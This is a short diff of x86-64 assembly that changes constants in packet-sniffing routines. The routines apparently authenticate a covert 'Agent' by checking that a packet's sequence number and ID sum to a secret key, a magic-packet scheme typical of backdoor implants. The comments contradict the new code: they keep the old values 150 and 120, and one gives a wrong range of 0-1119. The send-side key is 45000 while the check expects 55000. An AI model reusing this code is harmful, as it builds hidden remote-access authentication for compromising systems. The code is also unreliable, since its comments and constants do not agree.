@@ -164,7 +164,7 @@ _sniff:
     xchg dl, dh                         ; Endianness correction
     
     add eax, edx                        ; EAX = SEQ + ID
-    cmp eax, 150                        ; Verify Agent's asymmetric return key (150)
+    cmp eax, 55000                        ; Verify Agent's asymmetric return key (150)
     
     pop rdx                             ; Restore saved RDX
     pop rax                             ; Restore saved RAX (Packet size)
@@ -279,7 +279,7 @@ _sniff_chunk:
     xchg dl, dh                         ; Endianness correction
     
     add eax, edx                        ; EAX = SEQ + ID
-    cmp eax, 150                        ; Verify Agent's asymmetric return key (150)
+    cmp eax, 55000                        ; Verify Agent's asymmetric return key (150)
     
     pop rdx                             ; Restore saved RDX
     pop rax                             ; Restore saved RAX (Packet size)
@@ -383,13 +383,13 @@ _create_seq_id:
     ; 1. Generate a random number (1-119) for the Identifier
     rdtsc
     xor edx, edx    ; Clear EDX before division to prevent hardware exception
-    mov ecx, 119
-    div ecx         ; EDX now contains the remainder (0-118)
-    inc edx         ; EDX is now a random number between 1 and 119 (ID)
+    mov ecx, 20000
+    div ecx         ; EDX now contains the remainder (0-1119)
+    add edx,10000         ; EDX is now a random number between 10000 and 29999 (ID)
 
     ; 2. Calculate the corresponding Sequence number
-    mov eax, 120    ; Load the master key total (120) into EAX
-    sub eax, edx    ; EAX = 120 - EDX (This becomes the SEQ value)
+    mov eax, 45000    ; Load the master key total (120) into EAX
+    sub eax, edx    ; EAX = 45000 - EDX (This becomes the SEQ value)
 
     ; 3. Network Byte Order (Endianness) Correction
     ; Convert to Big-Endian as required by network protocols
